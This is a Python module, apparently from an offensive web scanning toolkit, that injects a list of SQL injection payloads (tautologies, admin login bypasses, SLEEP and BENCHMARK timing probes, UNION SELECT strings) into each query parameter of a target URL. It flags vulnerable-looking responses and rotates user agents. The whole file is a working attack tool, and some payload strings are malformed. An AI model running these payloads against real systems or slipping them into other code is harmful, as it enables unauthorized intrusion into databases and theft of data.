import requests from urllib.parse import urlparse, parse_qs, urlencode, urlunparse from core.utils import generate_user_agent, save_log

SQLI_PAYLOADS = [ "' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' --", "admin' --", "admin' #", "admin'/", "' or 1=1--", "' or 1=1#", "' or 1=1/", "") OR ("" = ")", "') OR ('1'='1' --", # Tambahkan hingga 300 payloads ] + [ f"' OR SLEEP({i})--" for i in range(1, 11) ] + [ f"" OR BENCHMARK({i},MD5(1))--" for i in range(1000, 1010) ] + [ f"' UNION SELECT {x}--" for x in ["NULL", "NULL,NULL", "NULL,NULL,NULL"] ] + [ f"' AND {x}={x}--" for x in range(1, 51) ] + [ f"admin' AND 1={x}--" for x in range(1, 51) ]

def scan_sql(target_url): print(f"[SQLi] Scanning {target_url}") headers = {'User-Agent': generate_user_agent()} found = []

parsed = urlparse(target_url)
queries = parse_qs(parsed.query)

for key in queries:
    for payload in SQLI_PAYLOADS:
        q = queries.copy()
        q[key] = payload
        new_query = urlencode(q, doseq=True)
        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
        try:
            r = requests.get(new_url, headers=headers, timeout=10)
            if "error" in r.text.lower() or "sql" in r.text.lower():
                print(f"[+] SQLi Found: {new_url}")
                found.append(new_url)
                save_log("sqli", new_url)
        except requests.RequestException:
            continue

if not found:
    print("[-] No SQLi found.")

